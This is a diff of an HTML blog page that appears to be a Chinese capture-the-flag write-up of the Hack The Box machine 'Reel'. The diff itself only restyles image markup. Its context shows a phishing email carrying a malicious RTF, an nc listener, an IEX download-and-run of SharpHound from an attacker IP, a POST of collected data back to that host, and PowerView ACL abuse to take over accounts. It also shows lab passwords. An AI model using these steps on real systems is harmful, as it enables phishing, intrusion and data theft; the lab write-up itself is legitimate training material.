@@ -132,7 +132,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -227,8 +227,22 @@
 
 
 <h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>ftp可以匿名访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111701.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111702.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="AppLocker-docx"><a href="#AppLocker-docx" class="headerlink" title="AppLocker.docx"></a>AppLocker.docx</h2><p>里面就一句话：</p>
 <blockquote>
 <p>AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.</p>
@@ -261,12 +275,40 @@
 <h2 id="sendemail-amp-amp-getshell"><a href="#sendemail-amp-amp-getshell" class="headerlink" title="sendemail &amp;&amp; getshell"></a>sendemail &amp;&amp; getshell</h2><p>然后准备就绪，发送钓鱼邮件，getshell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m SimpleHTTPServer 80</span><br><span class="line">nc -lvvp 443</span><br><span class="line">sendEmail -f miao@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111703.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111704.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="msf一键"><a href="#msf一键" class="headerlink" title="msf一键"></a>msf一键</h2><p>msf有<code>exploit/windows/fileformat/office_word_hta</code>这个模块，可以一键生成hta，rtf文件，启动监听，只需要自己sendemail就可以</p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的nico用户shell，桌面得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111706.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="nico-to-tom"><a href="#nico-to-tom" class="headerlink" title="nico to tom"></a>nico to tom</h1><h2 id="cred-xml"><a href="#cred-xml" class="headerlink" title="cred.xml"></a>cred.xml</h2><p>nico用户桌面有个cred.xml文件,里面是tom账号认证信息：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Objs</span> <span class="attr">Version</span>=<span class="string">"1.1.0.1"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/powershell/2004/04"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Obj</span> <span class="attr">RefId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TN</span> <span class="attr">RefId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">T</span>&gt;</span>System.Management.Automation.PSCredential<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">T</span>&gt;</span>System.Object<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TN</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ToString</span>&gt;</span>System.Management.Automation.PSCredential<span class="tag">&lt;/<span class="name">ToString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Props</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">S</span> <span class="attr">N</span>=<span class="string">"UserName"</span>&gt;</span>HTB\Tom<span class="tag">&lt;/<span class="name">S</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SS</span> <span class="attr">N</span>=<span class="string">"Password"</span>&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692<span class="tag">&lt;/<span class="name">SS</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Obj</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Objs</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -274,9 +316,23 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;$cred &#x3D; Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;</span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>
 
 <h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>注意前面开了22端口SSH，tom账号可以直接ssh登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111707.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>tom用户桌面<code>AD Audit</code>目录直接有BloodHound(这个确实是靶机原本就有的，不是别人传的)和一个note.txt：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111708.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="groups"><a href="#groups" class="headerlink" title="groups"></a>groups</h2><p>根据提示信息，去看一下其他用户组,发现Backup_Admins组，这类用户组一般都有特权：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$groups</span> = [adsi] <span class="string">"LDAP://REEL:389/OU=Groups,DC=HTB,DC=LOCAL"</span></span><br><span class="line"><span class="variable">$searcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher <span class="variable">$groups</span></span><br><span class="line"><span class="variable">$searcher</span>.Filter = <span class="string">'(objectClass=Group)'</span></span><br><span class="line"><span class="variable">$results</span> = <span class="variable">$searcher</span>.FindAll()</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">in</span> <span class="variable">$results</span>) &#123;<span class="variable">$group</span> = <span class="variable">$result</span>.Properties;<span class="variable">$group</span>.name&#125;</span><br><span class="line"></span><br><span class="line">Backup_Admins</span><br><span class="line">AppLocker_Test</span><br><span class="line">SharePoint_Admins</span><br><span class="line">DR_Site</span><br><span class="line">SQL_Admins</span><br><span class="line">HelpDesk_Admins</span><br><span class="line">Restrictions</span><br><span class="line">All_Staff</span><br><span class="line">MegaBank_Users</span><br><span class="line">Finance_Users</span><br><span class="line">HR_Team</span><br></pre></td></tr></table></figure>
 
@@ -291,26 +347,68 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.Webclient).downloadstring(<span class="string">"http://10.10.14.6:9999/SharpHound.ps1"</span>)</span><br><span class="line">Invoke-BloodHound -CollectionMethod All</span><br><span class="line"></span><br><span class="line"><span class="variable">$Base64String</span> = [System.convert]::ToBase64String((<span class="built_in">Get-Content</span> -Path <span class="string">'c:/temp/20201117065659_BloodHound.zip'</span> -Encoding Byte))</span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> -Uri http://<span class="number">10.10</span>.<span class="number">14.6</span>:<span class="number">4445</span> -Method POST -Body <span class="variable">$Base64String</span></span><br><span class="line"></span><br><span class="line">echo &lt;base64 encoded zip file&gt; | base64 -d -w <span class="number">0</span> &gt; bloodhound_reel.zip</span><br></pre></td></tr></table></figure>
 
 <p>简单分析，发现tom用户可以通过claire用户到Backup_Admins：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111709.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="tom-to-claire"><a href="#tom-to-claire" class="headerlink" title="tom to claire"></a>tom to claire</h1><p>就是导入powerview，根据bloodhound信息一步步,然后就可以用我们设置的密码ssh登录claire账户：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入powerview</span></span><br><span class="line">. .\PowerView.ps1</span><br><span class="line"><span class="comment"># 将tom设置为claire的ACL的所有者</span></span><br><span class="line">Set-DomainObjectOwner -identity claire -OwnerIdentity tom</span><br><span class="line"><span class="comment"># 授予tom权限以更改该ACL上的密码</span></span><br><span class="line">Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword</span><br><span class="line"><span class="comment"># 创建一个凭证，然后设置克莱尔的密码</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"qwer1234QWER!@#$"</span> -AsPlainText -force</span><br><span class="line">Set-DomainUserPassword -identity claire -accountpassword <span class="variable">$cred</span></span><br><span class="line"><span class="comment"># 以上操作建议直接一次性复制粘贴，有自动重置</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111710.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="claire-to-Backup-Admins"><a href="#claire-to-Backup-Admins" class="headerlink" title="claire to Backup_Admins"></a>claire to Backup_Admins</h1><p>根据bloodhound的信息，claire对Backup_Admins有GenericWrite权限，还是一步步,(预期是到backup，bloodhound给的提示是能到domain admin的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111711.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group backup_admins claire /add</span><br><span class="line"><span class="comment"># 添加到backup_admins组后需要重新登录才会生效</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Backup-Admins-to-Administrator"><a href="#Backup-Admins-to-Administrator" class="headerlink" title="Backup_Admins to Administrator"></a>Backup_Admins to Administrator</h1><p>查看权限，backup_admins对Administrator有完全访问权限：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">claire@REEL C:\Users&gt;icacls Administrator</span><br><span class="line">Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)</span><br><span class="line">              HTB\Backup_Admins:(OI)(CI)(F)</span><br><span class="line">              HTB\Administrator:(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Administrators:(OI)(CI)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure>
 
 <p>但直接去读root.txt还是被禁止：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111712.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="Backup-Scripts"><a href="#Backup-Scripts" class="headerlink" title="Backup Scripts"></a>Backup Scripts</h2><p> 备份脚本里得到admin密码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111713.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin password</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">"Cr4ckMeIfYouC4n!"</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后就直接登录Administrator，桌面得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111714.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111714.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>smtp-user-enum | pentestmonkey<br><a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" target="_blank" rel="noopener">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></li>
 <li>bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.<br><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-0199</a></li>
